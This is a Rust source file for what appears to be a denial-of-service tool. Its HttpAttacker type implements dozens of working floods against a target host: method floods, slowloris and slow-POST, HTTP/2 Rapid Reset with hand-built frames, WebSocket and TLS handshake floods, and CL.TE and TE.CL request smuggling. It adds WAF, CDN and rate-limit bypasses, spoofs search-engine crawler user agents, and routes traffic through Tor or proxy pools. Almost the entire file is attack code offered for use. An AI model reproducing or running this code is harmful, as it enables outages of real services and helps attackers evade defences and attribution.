use std::time::Duration;
use std::io::{Write, Read};
use std::net::{TcpStream, SocketAddr};
use rand::Rng;
use rand::seq::SliceRandom;
use crate::attack::WorkerCtx;
use crate::bypass::{BypassHeaders, WafBypass, RateLimitBypass, CdnBypass, random_tls_client_hello};

pub struct HttpAttacker { ctx: WorkerCtx }

impl HttpAttacker {
    pub fn from_ctx(ctx: &WorkerCtx) -> Self { Self { ctx: ctx.clone() } }

    fn alive(&self) -> bool { self.ctx.alive() }
    fn ok(&self)            { self.ctx.ok(); }
    fn err(&self)           { self.ctx.err(); }

    fn connect_direct(&self) -> Option<TcpStream> {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        let sa: SocketAddr = addr.parse().ok()?;
        let s = TcpStream::connect_timeout(&sa, Duration::from_millis(self.ctx.connect_ms)).ok()?;
        s.set_nodelay(true).ok()?;
        s.set_write_timeout(Some(Duration::from_millis(self.ctx.write_ms))).ok()?;
        s.set_read_timeout(Some(Duration::from_millis(self.ctx.read_ms))).ok()?;
        Some(s)
    }

    fn connect(&self) -> Option<TcpStream> {
        let timeout = Duration::from_millis(self.ctx.connect_ms);
        if let Some(ref socks) = self.ctx.tor_socks {
            let proxy = crate::proxy::Proxy {
                host: "127.0.0.1".to_string(),
                port: socks.split(':').nth(1).and_then(|p| p.parse().ok()).unwrap_or(9050),
                ptype: crate::config::ProxyType::Socks5,
                username: None, password: None, latency_ms: 0, alive: true, fail_count: 0,
            };
            proxy.tunnel(&self.ctx.target, self.ctx.port, timeout).ok()
        } else if let Some(ref pool) = self.ctx.proxy_pool {
            if let Some(proxy) = pool.get() {
                match proxy.tunnel(&self.ctx.target, self.ctx.port, timeout) {
                    Ok(s) => Some(s),
                    Err(_) => { pool.mark_failed(&proxy); self.connect_direct() }
                }
            } else { self.connect_direct() }
        } else { self.connect_direct() }
    }

    fn write_tracked(&self, s: &mut TcpStream, data: &[u8]) -> bool {
        match s.write_all(data) {
            Ok(_) => { self.ctx.add_bytes(data.len() as u64); self.ok(); true }
            Err(_) => { self.err(); false }
        }
    }

    fn burst(&self, s: &mut TcpStream, req: &str, count: usize) {
        let rb = req.as_bytes();
        for _ in 0..count {
            if !self.alive() { break; }
            if !self.write_tracked(s, rb) { break; }
        }
    }

fn rand_string(n: usize) -> String {
        (0..n).map(|_| (b'a' + rand::thread_rng().gen_range(0..26u8)) as char).collect()
    }

    fn rand_json_body() -> String {
        let mut rng = rand::thread_rng();
        format!(
            "{{\"id\":{},\"query\":\"{}\",\"data\":\"{}\",\"ts\":{}}}",
            rng.gen::<u32>(), Self::rand_string(16),
            Self::rand_string(64), rng.gen::<u64>()
        )
    }

    

    
    pub async fn get_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let mut req = bh.build_get_request(&self.ctx.target);

                
                for (k, v) in CdnBypass::js_challenge_bypass_header() {
                    req = req.replacen("\r\n\r\n", &format!("\r\n{}: {}\r\n\r\n", k, v), 1);
                }
                let cookie = CdnBypass::generate_cookies(&self.ctx.target);
                req = req.replacen("\r\n\r\n", &format!("\r\nCookie: {}\r\n\r\n", cookie), 1);

                self.burst(&mut s, &req, 80);
            } else { self.err(); }
        }
    }

    
    pub async fn post_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let body = Self::rand_json_body();
                let req = bh.build_post_request(&self.ctx.target, &body);
                self.burst(&mut s, &req, 40);
            } else { self.err(); }
        }
    }

    
    pub async fn head_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let req = format!(
                    "HEAD {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n\r\n",
                    bh.path, self.ctx.target, bh.user_agent
                );
                self.burst(&mut s, &req, 100);
            } else { self.err(); }
        }
    }

    
    pub async fn put_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let body: Vec<u8> = (0..2048).map(|_| rand::thread_rng().gen()).collect();
                let req = format!(
                    "PUT {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Length: {}\r\nContent-Type: application/octet-stream\r\nConnection: keep-alive\r\n\r\n",
                    bh.path, self.ctx.target, bh.user_agent, body.len()
                );
                if s.write_all(req.as_bytes()).is_ok() && s.write_all(&body).is_ok() {
                    self.ok();
                } else { self.err(); }
            } else { self.err(); }
        }
    }

    
    pub async fn delete_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let req = format!(
                    "DELETE /{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n\r\n",
                    Self::rand_string(12), self.ctx.target, bh.user_agent
                );
                self.burst(&mut s, &req, 50);
            } else { self.err(); }
        }
    }

    
    pub async fn options_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let req = format!(
                    "OPTIONS * HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccess-Control-Request-Method: POST\r\nAccess-Control-Request-Headers: content-type,x-auth-token\r\nOrigin: https://evil.com\r\nConnection: keep-alive\r\n\r\n",
                    self.ctx.target, bh.user_agent
                );
                self.burst(&mut s, &req, 60);
            } else { self.err(); }
        }
    }

    
    pub async fn patch_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let body = format!("{{\"op\":\"replace\",\"path\":\"/value\",\"value\":\"{}\"}}", Self::rand_string(32));
                let req = format!(
                    "PATCH {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Type: application/json-patch+json\r\nContent-Length: {}\r\nConnection: keep-alive\r\n\r\n{}",
                    bh.path, self.ctx.target, bh.user_agent, body.len(), body
                );
                if s.write_all(req.as_bytes()).is_ok() { self.ok(); } else { self.err(); }
            } else { self.err(); }
        }
    }

    
    pub async fn slowloris(&self) {
        let mut streams: Vec<TcpStream> = vec![];
        while self.alive() {
            
            while streams.len() < 1000 && self.alive() {
                if let Some(mut s) = self.connect() {
                    let bh = BypassHeaders::generate(&self.ctx.target);
                    let init = format!(
                        "GET {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept-Encoding: gzip\r\nCookie: {}\r\n",
                        bh.path, self.ctx.target, bh.user_agent,
                        CdnBypass::generate_cookies(&self.ctx.target)
                    );
                    if s.write_all(init.as_bytes()).is_ok() {
                        self.ok();
                        streams.push(s);
                    }
                }
            }
            
            streams.retain_mut(|s| {
                let header = format!("X-{}: {}\r\n", Self::rand_string(8), Self::rand_string(16));
                s.write_all(header.as_bytes()).is_ok()
            });
            tokio::time::sleep(Duration::from_secs(12)).await;
        }
    }

    
    pub async fn slow_post(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let req = format!(
                    "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 10000000\r\nConnection: keep-alive\r\n\r\n",
                    bh.path, self.ctx.target, bh.user_agent
                );
                if s.write_all(req.as_bytes()).is_ok() {
                    self.ok();
                    for _ in 0..200 {
                        if !self.alive() { break; }
                        let _ = s.write_all(b"a");
                        tokio::time::sleep(Duration::from_millis(100)).await;
                    }
                } else { self.err(); }
            } else { self.err(); }
        }
    }

    
    pub async fn slow_headers(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let init = format!(
                    "GET {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\n",
                    bh.path, self.ctx.target, bh.user_agent
                );
                if s.write_all(init.as_bytes()).is_ok() {
                    self.ok();
                    for _ in 0..300 {
                        if !self.alive() { break; }
                        let hdr = format!("X-{}: {}\r\n", Self::rand_string(6), Self::rand_string(10));
                        if s.write_all(hdr.as_bytes()).is_err() { break; }
                        tokio::time::sleep(Duration::from_secs(2)).await;
                    }
                } else { self.err(); }
            } else { self.err(); }
        }
    }

    
    pub async fn http2_rapid_reset(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
                
                let settings: Vec<u8> = vec![0x00,0x00,0x12,0x04,0x00,0x00,0x00,0x00,0x00,
                    0x00,0x03,0x00,0x00,0x00,0x64,0x00,0x04,0x00,0x40,0x00,0x00,0x00,0x05,0x00,0x00,0x40,0x00];
                
                let winupd: Vec<u8> = vec![0x00,0x00,0x04,0x08,0x00,0x00,0x00,0x00,0x00,0x3f,0xff,0x00,0x00];

                if s.write_all(preface).is_err() { self.err(); continue; }
                if s.write_all(&settings).is_err() { self.err(); continue; }
                if s.write_all(&winupd).is_err() { self.err(); continue; }

                let mut buf = [0u8; 64];
                let _ = s.read(&mut buf);

                
                let settings_ack: Vec<u8> = vec![0x00,0x00,0x00,0x04,0x01,0x00,0x00,0x00,0x00];
                let _ = s.write_all(&settings_ack);

                
                for stream_id in (1u32..2000).step_by(2) {
                    if !self.alive() { break; }
                    let sid = stream_id.to_be_bytes();

                    
                    let headers: Vec<u8> = vec![
                        0x00,0x00,0x05,0x01,0x24,
                        sid[0],sid[1],sid[2],sid[3],
                        0x82,0x87,0x84,0x01,0x00,
                    ];
                    
                    let rst: Vec<u8> = vec![
                        0x00,0x00,0x04,0x03,0x00,
                        sid[0],sid[1],sid[2],sid[3],
                        0x00,0x00,0x00,0x08,
                    ];

                    if s.write_all(&headers).is_ok() && s.write_all(&rst).is_ok() {
                        self.ok();
                    } else {
                        self.err();
                        break;
                    }
                }
            } else { self.err(); }
        }
    }

    
    pub async fn http2_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
                let settings: Vec<u8> = vec![0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00];
                if s.write_all(preface).is_err() || s.write_all(&settings).is_err() {
                    self.err(); continue;
                }
                let mut buf = [0u8; 64];
                let _ = s.read(&mut buf);
                let ack: Vec<u8> = vec![0x00,0x00,0x00,0x04,0x01,0x00,0x00,0x00,0x00];
                let _ = s.write_all(&ack);

                for stream_id in (1u32..10000).step_by(2) {
                    if !self.alive() { break; }
                    let sid = stream_id.to_be_bytes();
                    let frame: Vec<u8> = vec![
                        0x00,0x00,0x05,0x01,0x05,
                        sid[0],sid[1],sid[2],sid[3],
                        0x82,0x87,0x84,0x01,0x00,
                    ];
                    if s.write_all(&frame).is_ok() { self.ok(); }
                    else { self.err(); break; }
                }
            } else { self.err(); }
        }
    }

    
    pub async fn cache_bypass(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let buster = format!("?nocache={}&_={}", rand::thread_rng().gen::<u64>(), rand::thread_rng().gen::<u32>());
                let req = format!(
                    "GET {}{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nCache-Control: no-cache, no-store, must-revalidate, max-age=0\r\nPragma: no-cache\r\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\r\nIf-None-Match: \"{}\"\r\nIf-Modified-Since: Thu, 01 Jan 1970 00:00:00 GMT\r\nConnection: keep-alive\r\n\r\n",
                    WafBypass::obfuscate_path(bh.path),
                    buster, self.ctx.target, bh.user_agent,
                    Self::rand_string(32)
                );
                self.burst(&mut s, &req, 50);
            } else { self.err(); }
        }
    }

    
    pub async fn websocket_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let key = base64_encode(&rand::thread_rng().gen::<[u8; 16]>());
                let hs = format!(
                    "GET /ws HTTP/1.1\r\nHost: {}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {}\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\r\nUser-Agent: {}\r\nOrigin: https://{}\r\n\r\n",
                    self.ctx.target, key, bh.user_agent, self.ctx.target
                );
                if s.write_all(hs.as_bytes()).is_ok() {
                    self.ok();
                    let mut buf = [0u8; 512];
                    let _ = s.read(&mut buf);
                    
                    let payload: Vec<u8> = (0..125).map(|_| rand::thread_rng().gen()).collect();
                    let frame = build_ws_frame(&payload);
                    for _ in 0..5000 {
                        if !self.alive() { break; }
                        if s.write_all(&frame).is_err() { break; }
                        self.ok();
                    }
                } else { self.err(); }
            } else { self.err(); }
        }
    }

    
    pub async fn chunked_bypass(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let body = Self::rand_string(256);
                let req = WafBypass::chunked_request(&self.ctx.target, bh.path, &body, bh.user_agent);
                if s.write_all(req.as_bytes()).is_ok() { self.ok(); }
                else { self.err(); }
            } else { self.err(); }
        }
    }

    
    pub async fn multipart_bypass(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let req = WafBypass::multipart_request(&self.ctx.target, bh.path, bh.user_agent);
                if s.write_all(req.as_bytes()).is_ok() { self.ok(); }
                else { self.err(); }
            } else { self.err(); }
        }
    }

    
    pub async fn smuggle_cl_te(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let req = WafBypass::desync_cl_te_prefix(&self.ctx.target, bh.path, bh.user_agent);
                if s.write_all(req.as_bytes()).is_ok() { self.ok(); }
                else { self.err(); }
            } else { self.err(); }
        }
    }

    
    pub async fn smuggle_te_cl(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let req = WafBypass::desync_te_cl_prefix(&self.ctx.target, bh.path, bh.user_agent);
                if s.write_all(req.as_bytes()).is_ok() { self.ok(); }
                else { self.err(); }
            } else { self.err(); }
        }
    }

    
    pub async fn xff_bypass_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let spoof = RateLimitBypass::spoof_headers();
                let mut req = format!(
                    "GET {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n",
                    bh.path, self.ctx.target, bh.user_agent
                );
                for (k, v) in &spoof { req.push_str(&format!("{}: {}\r\n", k, v)); }
                req.push_str("\r\n");
                self.burst(&mut s, &req, 60);
            } else { self.err(); }
        }
    }

    
    pub async fn bot_bypass_flood(&self) {
        let bot_agents = [
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
            "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
            "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
            "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
            "Twitterbot/1.0",
            "LinkedInBot/1.0",
        ];
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let ua = bot_agents.choose(&mut rand::thread_rng()).unwrap_or(&bot_agents[0]);
                let req = format!(
                    "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
                    self.ctx.target, ua
                );
                self.burst(&mut s, &req, 60);
            } else { self.err(); }
        }
    }

    
    pub async fn tls_handshake_flood(&self) {
        use crate::bypass::random_tls_client_hello;
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let hello = random_tls_client_hello(&self.ctx.target);
                if s.write_all(&hello).is_ok() {
                    self.ok();
                    let mut buf = [0u8; 16384];
                    let _ = s.read(&mut buf);
                } else { self.err(); }
            } else { self.err(); }
        }
    }

    
    pub async fn tls_session_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let mut rng = rand::thread_rng();
                let mut hello = vec![0x16u8, 0x03, 0x03];
                let ticket: Vec<u8> = (0..64).map(|_| rng.gen()).collect();
                
                let mut payload = vec![0x01, 0x00, 0x00, 0x60];
                payload.extend_from_slice(&[0x03, 0x03]);
                payload.extend((0..32).map(|_| rng.gen::<u8>()));
                payload.push(0x00);
                payload.extend_from_slice(&[0x00, 0x02, 0xc0, 0x2f]);
                payload.push(0x01); payload.push(0x00);
                payload.extend_from_slice(&[0x00, 0x06, 0x00, 0x23, 0x00, 0x40]);
                payload.extend_from_slice(&ticket);
                hello.extend_from_slice(&(payload.len() as u16).to_be_bytes());
                hello.extend_from_slice(&payload);
                if s.write_all(&hello).is_ok() { self.ok(); } else { self.err(); }
            } else { self.err(); }
        }
    }

    
    pub async fn graphql_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let field = Self::rand_string(8);
                let query = format!(
                    "{{\"query\":\"{{ {} {{ id name {} }} }}\",\"variables\":{{}}}}",
                    field, Self::rand_string(6)
                );
                let req = format!(
                    "POST /graphql HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: keep-alive\r\n\r\n{}",
                    self.ctx.target, bh.user_agent, query.len(), query
                );
                self.burst(&mut s, &req, 30);
            } else { self.err(); }
        }
    }

    
    pub async fn api_key_bypass(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let fake_key: String = (0..32).map(|_| format!("{:02x}", rand::thread_rng().gen::<u8>())).collect();
                let req = format!(
                    "GET {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAuthorization: Bearer {}\r\nX-API-Key: {}\r\nX-Auth-Token: {}\r\nConnection: keep-alive\r\n\r\n",
                    bh.path, self.ctx.target, bh.user_agent, fake_key, fake_key, fake_key
                );
                self.burst(&mut s, &req, 50);
            } else { self.err(); }
        }
    }

    
    pub async fn range_bypass_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let start = rand::thread_rng().gen_range(0..1000000u64);
                let req = format!(
                    "GET {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nRange: bytes={}-{}\r\nConnection: keep-alive\r\n\r\n",
                    bh.path, self.ctx.target, bh.user_agent, start, start + 10485760
                );
                self.burst(&mut s, &req, 40);
            } else { self.err(); }
        }
    }

    
    pub async fn connect_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let fake_target = format!("{}:443", Self::rand_string(10));
                let req = format!(
                    "CONNECT {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nProxy-Connection: keep-alive\r\n\r\n",
                    fake_target, self.ctx.target, bh.user_agent
                );
                if s.write_all(req.as_bytes()).is_ok() { self.ok(); } else { self.err(); }
            } else { self.err(); }
        }
    }

    
    pub async fn trace_flood(&self) {
        while self.alive() {
            if let Some(mut s) = self.connect() {
                let bh = BypassHeaders::generate(&self.ctx.target);
                let req = format!(
                    "TRACE {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nMax-Forwards: 0\r\nConnection: keep-alive\r\n\r\n",
                    bh.path, self.ctx.target, bh.user_agent
                );
                self.burst(&mut s, &req, 60);
            } else { self.err(); }
        }
    }
}

fn base64_encode(data: &[u8]) -> String {
    const C: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut r = String::new();
    let mut i = 0;
    while i < data.len() {
        let b0 = data[i] as usize;
        let b1 = if i+1 < data.len() { data[i+1] as usize } else { 0 };
        let b2 = if i+2 < data.len() { data[i+2] as usize } else { 0 };
        r.push(C[b0>>2] as char);
        r.push(C[((b0&3)<<4)|(b1>>4)] as char);
        r.push(if i+1<data.len() { C[((b1&15)<<2)|(b2>>6)] as char } else { '=' });
        r.push(if i+2<data.len() { C[b2&63] as char } else { '=' });
        i += 3;
    }
    r
}

fn build_ws_frame(payload: &[u8]) -> Vec<u8> {
    let mut f = vec![0x82u8];
    let len = payload.len();
    if len < 126 { f.push(0x80 | len as u8); }
    else { f.push(0xFE); f.push((len>>8) as u8); f.push(len as u8); }
    let mask: [u8;4] = rand::thread_rng().gen();
    f.extend_from_slice(&mask);
    for (i, &b) in payload.iter().enumerate() { f.push(b ^ mask[i%4]); }
    f
}
